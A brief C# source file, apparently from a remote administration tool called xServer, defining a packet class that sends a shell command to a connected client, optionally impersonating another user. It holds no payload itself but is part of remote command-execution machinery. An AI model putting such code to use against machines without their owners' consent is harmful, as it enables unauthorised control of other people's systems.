using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoShellExecute : IPacket
    {
        public string Command { get; set; }
        public bool impersonate { get; set; }
        public string user { get; set; }

        public DoShellExecute()
        {
        }

        public DoShellExecute(string command, bool impersonate = false, string user = null)
        {
            this.Command = command;
            this.impersonate = impersonate;
            this.user = user;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}